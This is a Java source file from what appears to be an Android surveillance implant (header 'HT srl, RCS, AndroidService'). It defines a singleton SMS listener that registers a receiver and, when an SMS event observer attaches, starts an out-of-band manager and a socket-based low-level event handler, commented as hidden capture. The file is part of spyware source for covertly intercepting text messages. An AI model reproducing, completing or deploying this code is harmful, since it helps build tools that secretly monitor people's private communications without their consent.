/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerSms.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import com.android.dvci.auto.Cfg;
import com.android.dvci.event.EventSms;
import com.android.dvci.event.OOB.OOBManager;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.message.Sms;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEventHandler;

public class ListenerSms extends Listener<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerSms"; //$NON-NLS-1$
	private static LowEventHandler lle=null;
	private static OOBManager oob = null;

	private BSm smsReceiver;

	/** The singleton. */
	private volatile static ListenerSms singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerSms self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new ListenerSms();
					oob = OOBManager.self();
				}
			}
		}

		return singleton;
	}

	@Override
	public synchronized boolean attach(Observer<Sms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		if(!oob.isThreadRunning() && o.getClass() == EventSms.class) {
			// cattura hidden
			// Low events receivers
			lle = new LowEventHandler();
			oob.start();
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<Sms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}

	@Override
	protected void start() {
		registerSms();
	}

	@Override
	protected void stop() {
		if (oob.isThreadRunning()) {
			oob.stop();
		}
		if (lle != null) {
			lle.closeSocketServer();
			lle = null;
		}

	}

	/**
	 * Register the SMS monitor.
	 */
	private void registerSms() {
		smsReceiver = new BSm();
	}

	public int internalDispatch(Sms sms) {
		return dispatch(sms);
	}
}
